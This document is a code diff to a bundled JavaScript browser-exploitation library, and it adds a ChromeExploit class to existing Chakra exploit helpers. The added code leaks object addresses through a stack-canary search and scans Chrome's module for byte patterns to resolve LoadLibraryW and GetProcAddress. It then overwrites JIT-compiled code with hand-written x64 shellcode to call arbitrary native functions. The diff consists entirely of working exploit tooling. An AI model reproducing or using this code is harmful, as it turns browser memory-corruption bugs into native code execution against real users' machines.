@@ -1305,17 +1305,23 @@ function BaseExploit(bitness) {
     var exploit = this;
 
     function cString(s) {
-        var ss = '';
-        for (var i = 0; i < s.length / 2 + 2; i++) {
-            ss += String.fromCharCode((s.charCodeAt(i*2)|0) + ((s.charCodeAt(i*2+1)|0) << 8));
+        var u8 = new Uint8Array(s.length + 1);
+        for (var i = 0; i < s.length; i++) {
+            u8[i] = s.charCodeAt(i);
         }
-        return wString(ss);
+        u8[i] = 0;
+        strings.push(u8);
+        return exploit.addressOfArrayBuffer(u8.buffer);
     }
 
     function wString(s) {
-        strings.push(s);
-        parseInt(s);
-        return exploit.addressOfString(s);
+        var u16 = new Uint16Array(s.length + 1);
+        for (var i = 0; i < s.length; i++) {
+            u16[i] = s.charCodeAt(i);
+        }
+        u16[i] = 0;
+        strings.push(u16);
+        return exploit.addressOfArrayBuffer(u16.buffer);
     }
 
     function getProcAddress(library, procName) {
@@ -1381,6 +1387,7 @@ function BaseExploit(bitness) {
             } else {
                 target.add(idx).store(value);
             }
+            return true;
         },
     };
 
@@ -1863,6 +1870,7 @@ function BaseExploit(bitness) {
 
     Object.assign(this, {
         importFunction,
+        loadLibrary,
         Pointer,
         CString,
         WString,
@@ -1964,6 +1972,9 @@ BaseExploit.prototype.findGadgets = function (module, query) {
         array[i / 4] = x.low;
         array[i / 4 + 1] = x.high;
         address.low += 8;
+        if ((address.low|0) == 0) {
+            address.high += 1;
+        }
     }
 
     var byteArray = new Uint8Array(array.buffer);
@@ -2135,13 +2146,15 @@ ChakraExploit.prototype.addressOf = function (obj) {
     return this.locateArrayPtr[0];
 }
 /**
- * Returns the address of a string. Points to the string's bytes.
+ * Returns the address of ArrayBuffer contents.
  *
- * @param {string} s A Javascript string
+ * @param {ArrayBuffer} ab ArrayBuffer
  * @returns {Pointer}
  */
-ChakraExploit.prototype.addressOfString = function (s) {
-    return this.Uint64Ptr.cast(this.addressOf(s).add(0x10)).load();
+ChakraExploit.prototype.addressOfArrayBuffer = function (ab) {
+    var dv = new DataView(ab);
+    var p = this.Uint64Ptr.cast(this.addressOf(dv));
+    return p[7];
 }
 ChakraExploit.prototype.findStackTop = function () {
     if (this.stackTop === undefined) {
@@ -2341,11 +2354,14 @@ Object.defineProperty(__webpack_exports__, "__esModule", { value: true });
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_0_baseexploit__ = __webpack_require__(1);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_1_chakraexploit__ = __webpack_require__(2);
 /* harmony import */ var __WEBPACK_IMPORTED_MODULE_2_chakrathreadexploit__ = __webpack_require__(4);
-/* harmony import */ var __WEBPACK_IMPORTED_MODULE_3_integer__ = __webpack_require__(0);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_3_chromeexploit__ = __webpack_require__(5);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_4_integer__ = __webpack_require__(0);
 /* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "BaseExploit", function() { return __WEBPACK_IMPORTED_MODULE_0_baseexploit__["a"]; });
 /* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "ChakraExploit", function() { return __WEBPACK_IMPORTED_MODULE_1_chakraexploit__["a"]; });
 /* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "ChakraThreadExploit", function() { return __WEBPACK_IMPORTED_MODULE_2_chakrathreadexploit__["a"]; });
-/* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "Integer", function() { return __WEBPACK_IMPORTED_MODULE_3_integer__["a"]; });
+/* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "ChromeExploit", function() { return __WEBPACK_IMPORTED_MODULE_3_chromeexploit__["a"]; });
+/* harmony reexport (binding) */ __webpack_require__.d(__webpack_exports__, "Integer", function() { return __WEBPACK_IMPORTED_MODULE_4_integer__["a"]; });
+
 
 
 
@@ -2433,6 +2449,253 @@ ChakraThreadExploit.prototype.write = function (address, value, size) {
 }
 
 /* harmony default export */ __webpack_exports__["a"] = (ChakraThreadExploit);
+
+
+/***/ }),
+/* 5 */
+/***/ (function(module, __webpack_exports__, __webpack_require__) {
+
+"use strict";
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_0_baseexploit__ = __webpack_require__(1);
+/* harmony import */ var __WEBPACK_IMPORTED_MODULE_1_integer__ = __webpack_require__(0);
+
+
+
+/**
+ * Constructs an exploit with sensible defaults for Chrome. Child must call initChrome method once read and write methods are available.
+ *
+ * @augments BaseExploit
+ * @class
+ * @constructor
+ */
+function ChromeExploit() {
+    var exploit = this;
+    __WEBPACK_IMPORTED_MODULE_0_baseexploit__["a" /* default */].call(this, 64);
+}
+ChromeExploit.prototype = Object.create(__WEBPACK_IMPORTED_MODULE_0_baseexploit__["a" /* default */].prototype);
+ChromeExploit.prototype.constructor = ChromeExploit;
+/**
+ * Initializes Chrome helpers using memory read and write.
+ *
+ * @param {Integer|Pointer} vtable Any address in the chrome DLL
+ */
+ChromeExploit.prototype.initChrome = function (vtable) {
+    this.chromeBase = this.findModuleBase(vtable);
+
+    /* Create a Function with a large amount of JIT code. */
+    var source = '';
+    for (var i = 0; i < 1000; i++) {
+        source += 'x[' + i + '] += ' + Math.random() + ';\n';
+    }
+    this.jitFunction = new Function('x', source);
+    var arr = new Array(1000).fill(0);
+    for (var i = 0; i < 10000; i++) {
+        this.jitFunction(arr);
+    }
+
+    /* Find g_main_thread_stack_start via code pattern matching. */
+    var gadgets = [
+        ['loadLibraryGetProcAddress', [0x48, 0x8D, 0x0D, -1, -1, -1, -1, 0xFF, 0x15, -1, -1, -1, -1, 0x48, 0x8B, 0xF8, 0x48, 0x85, 0xC0, 0x0F, 0x84, -1, -1, -1, -1, 0x48, 0x8D, 0x15, -1, -1, -1, -1, 0x48, 0x8B, 0xC8, 0xFF, 0x15, -1, -1, -1, -1]],
+        ['mainThreadStack', [0x48, 0x8B, 0x05, -1, -1, -1, -1, 0x48, 0x8D, 0x4C, 0x24, -1, 0x48, 0x2B, 0xC1, 0x48, 0x8D, 0x1D, -1, -1, -1, -1, 0x48, 0x3B, 0x05, -1, -1, -1, -1]],
+    ];
+    this.gadgets = this.findGadgets(this.chromeBase, gadgets);
+    this.mainThreadStackBase = new this.PointerType(this.Uint64Ptr).cast(
+        this.Uint64.cast(this.gadgets.mainThreadStack).add(7).add(
+            this.Int32Ptr.cast(this.gadgets.mainThreadStack.add(3))[0])
+    )[0];
+    this.LoadLibraryW = new this.PointerType(this.Uint64Ptr).cast(
+        this.Uint64.cast(this.gadgets.loadLibraryGetProcAddress).add(13).add(
+            this.Int32Ptr.cast(this.gadgets.loadLibraryGetProcAddress.add(9))[0])
+    )[0];
+    this.GetProcAddress = new this.PointerType(this.Uint64Ptr).cast(
+        this.Uint64.cast(this.gadgets.loadLibraryGetProcAddress).add(41).add(
+            this.Int32Ptr.cast(this.gadgets.loadLibraryGetProcAddress.add(37))[0])
+    )[0];
+}
+/**
+ * Returns the address of a Javascript object.
+ *
+ * @param {*} obj Any Javascript object
+ * @returns {Pointer}
+ */
+ChromeExploit.prototype.addressOf = function (obj) {
+    /* TODO: Implement faster version using a predefined Array. */
+    var arr = [obj];
+    return this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOfSlow(arr))[2].sub(1))[2].sub(1);
+}
+/**
+ * Returns the address of ArrayBuffer contents.
+ *
+ * @param {ArrayBuffer} ab ArrayBuffer
+ * @returns {Pointer}
+ */
+ChromeExploit.prototype.addressOfArrayBuffer = function (ab) {
+    var p = this.Uint64Ptr.cast(this.addressOf(ab));
+    return p[4];
+}
+/**
+ * Returns the address of a Javascript object. Internal.
+ *
+ * @param {*} obj Any Javascript object
+ * @returns {Pointer}
+ */
+ChromeExploit.prototype.addressOfSlow = function (obj) {
+    var address;
+    var canary1 = 0x13371338, canary2 = 0x1339133a, mainThreadStackBase = this.mainThreadStackBase;
+    obj.toString = function() {
+        /* Search stack for canary values. */
+        for (var i = 0; i > -0x1000; i--)
+        {
+            if (mainThreadStackBase[i - 2].high == canary2 && mainThreadStackBase[i - 1].high == canary1)
+            {
+                address = mainThreadStackBase[i].sub(1);
+                break;
+            }
+        }
+        return '';
+    };
+    String.prototype.indexOf.call(obj, canary1, canary2);
+    return address;
+}
+/**
+ * Call a function pointer with the given arguments. Used internally by FunctionPointer.
+ *
+ * @param {Integer} address
+ * @param {...Integer} args
+ * @returns {Integer}
+ */
+ChromeExploit.prototype.call = function (address, ...args) {
+    var self = this;
+    function validObjectAddress(x) {
+        return x.high <= 0x7FFF && (x.low & 7) == 1;
+    }
+    function addRspImm8(p, imm) {
+        p[0] = 0x48;
+        p[1] = 0x83;
+        p[2] = 0xc4;
+        p[3] = imm;
+        return p.add(4);
+    }
+    function callRax(p) {
+        p[0] = 0xff;
+        p[1] = 0xd0;
+        return p.add(2);
+    }
+    function movRaxImm64(p, imm) {
+        p[0] = 0x48;
+        p[1] = 0xb8;
+        self.Uint64Ptr.cast(p.add(2))[0] = imm;
+        return p.add(10);
+    }
+    function movRcxImm64(p, imm) {
+        p[0] = 0x48;
+        p[1] = 0xb9;
+        self.Uint64Ptr.cast(p.add(2))[0] = imm;
+        return p.add(10);
+    }
+    function movRdxImm64(p, imm) {
+        p[0] = 0x48;
+        p[1] = 0xba;
+        self.Uint64Ptr.cast(p.add(2))[0] = imm;
+        return p.add(10);
+    }
+    function movR8Imm64(p, imm) {
+        p[0] = 0x49;
+        p[1] = 0xb8;
+        self.Uint64Ptr.cast(p.add(2))[0] = imm;
+        return p.add(10);
+    }
+    function movR9Imm64(p, imm) {
+        p[0] = 0x49;
+        p[1] = 0xb9;
+        self.Uint64Ptr.cast(p.add(2))[0] = imm;
+        return p.add(10);
+    }
+    function pushRax(p) {
+        p[0] = 0x50;
+        return p.add(1);
+    }
+    function storeRax(p, dst) {
+        p[0] = 0x48;
+        p[1] = 0xa3;
+        self.Uint64Ptr.cast(p.add(2))[0] = dst;
+        return p.add(10);
+    }
+    function prologue(p) {
+        /* push rbp */
+        p[0] = 0x55;
+        p[1] = 0x48;
+        /* mov rbp, rsp */
+        p[2] = 0x89;
+        p[3] = 0xe5;
+        /* and rsp, ~0xf */
+        p[4] = 0x48;
+        p[5] = 0x83;
+        p[6] = 0xe4;
+        p[7] = 0xf0;
+        return p.add(8);
+    }
+    function epilogue(p) {
+        p[0] = 0xc9;
+        p[1] = 0xc3;
+        return p.add(2);
+    }
+    function jmp(p, offset) {
+        p[0] = 0xe9;
+        self.Int32Ptr.cast(p.add(1))[0] = offset;
+        return p.add(5);
+    }
+
+    var codeObject = this.Uint64Ptr.cast(this.Uint64Ptr.cast(this.addressOf(this.jitFunction))[7].sub(1));
+    if (validObjectAddress(codeObject[0]) && validObjectAddress(codeObject[1]) &&
+            validObjectAddress(codeObject[2]) && validObjectAddress(codeObject[3])) {
+        /* In newer versions of Chrome, function object points to the code header. */
+        var jitCode = this.Uint8Ptr.cast(codeObject).add(0x60);
+    } else {
+        /* In older versions of Chrome, function object points to the JIT code. */
+        var jitCode = this.Uint8Ptr.cast(codeObject);
+    }
+    var returnValAddress = this.Uint64Ptr.cast(jitCode.add(0x200));
+
+    /* Keep the stack aligned by pushing an even number of stack arguments. */
+    if (args.length > 4 && (args.length & 1)) {
+        args.push(0);
+    }
+
+    var p = jitCode;
+    /* Jump over code with heap pointers that get used during GC. */
+    p = jmp(p, 0x1000).add(0x1000);
+    /* Overwrite the JIT code with shellcode to load arguments and call function. */
+    p = prologue(p);
+    for (var i = args.length - 1; i >= 0; i--) {
+        if (i == 0) {
+            p = movRcxImm64(p, args[i]);
+        } else if (i == 1) {
+            p = movRdxImm64(p, args[i]);
+        } else if (i == 2) {
+            p = movR8Imm64(p, args[i]);
+        } else if (i == 3) {
+            p = movR9Imm64(p, args[i]);
+        } else {
+            p = movRaxImm64(p, args[i]);
+            p = pushRax(p);
+        }
+    }
+    p = addRspImm8(p, -0x20);
+    p = movRaxImm64(p, address);
+    p = callRax(p);
+    p = addRspImm8(p, 0x20);
+    p = storeRax(p, returnValAddress);
+    p = epilogue(p);
+
+    /* Call the JIT code. */
+    this.jitFunction();
+
+    /* Retrieve the return value. */
+    return returnValAddress[0];
+}
+
+/* harmony default export */ __webpack_exports__["a"] = (ChromeExploit);
 
 
 /***/ })
